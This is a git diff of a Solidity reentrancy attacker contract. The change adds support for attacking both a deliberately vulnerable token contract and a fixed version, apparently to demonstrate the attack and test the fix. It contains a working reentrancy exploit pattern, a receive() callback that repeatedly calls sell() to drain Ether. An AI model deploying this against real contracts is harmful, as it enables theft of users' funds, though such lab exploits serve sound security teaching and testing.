@@ -2,6 +2,7 @@
 pragma solidity ^0.8.28;
 
 import "./VulnerableScopeTwoToken.sol";
+import "./FixedVulnerableScopeTwoToken.sol";
 
 /// @title Reentrancy Attacker Contract
 /// @author Oleksandr Voronkov
@@ -10,6 +11,7 @@ import "./VulnerableScopeTwoToken.sol";
 contract ReentrancyAttacker {
   /// @notice The target vulnerable contract to attack.
   VulnerableScopeTwoToken public target;
+  FixedVulnerableScopeTwoToken public fixedTarget;
 
   /// @notice Total number of recursive attack calls to perform.
   uint256 public overallAttacksCount;
@@ -23,20 +25,26 @@ contract ReentrancyAttacker {
   /// @notice Flag to control if recursive reentrancy attack should continue.
   bool public keepAttacking = true;
 
+  /// @notice Flag to control if recursive reentrancy attack should continue.
+  bool public attackFixed = false;
+
   /// @notice Emitted on each reentrant attack step.
   /// @param attackNumber The current number of attack performed.
   event NewAttack(uint attackNumber);
 
   /// @notice Constructor sets the vulnerable target contract.
   /// @param _target Address of the vulnerable contract to attack.
-  constructor(address _target) {
+  constructor(address _target, address _fixedTarget) {
     target = VulnerableScopeTwoToken(_target);
+    fixedTarget = FixedVulnerableScopeTwoToken(_fixedTarget);
   }
 
   /// @notice Calls the vulnerable `buy()` function to purchase tokens.
   /// @dev Ether sent with this call will be forwarded to the target contract.
-  function buySomeTokens() external payable {
-    target.buy{ value: msg.value }();
+  function buySomeTokens(bool _fixed) external payable {
+    attackFixed = _fixed;
+    if (!attackFixed) target.buy{ value: msg.value }();
+    else fixedTarget.buy{ value: msg.value }();
   }
 
   /// @notice Sets the number of recursive attack attempts to perform.
@@ -47,9 +55,11 @@ contract ReentrancyAttacker {
 
   /// @notice Initiates the attack by calling `sell()` on the target.
   /// @param _amountToSell The amount of tokens to sell per reentrant step.
-  function attack(uint _amountToSell) external payable {
+  function attack(uint _amountToSell, bool _fixed) external payable {
     amountToSell = _amountToSell;
-    target.sell(amountToSell);
+    attackFixed = _fixed;
+    if (!attackFixed) target.sell(amountToSell);
+    else fixedTarget.sell(amountToSell);
   }
 
   /// @notice Called when the contract receives ETH. Triggers recursive reentrant attack if conditions are met.
@@ -57,7 +67,8 @@ contract ReentrancyAttacker {
     if (keepAttacking && attackCount < overallAttacksCount) {
       attackCount++;
       emit NewAttack(attackCount);
-      target.sell(amountToSell);
+      if (!attackFixed) target.sell(amountToSell);
+      else fixedTarget.sell(amountToSell);
     }
   }
 }
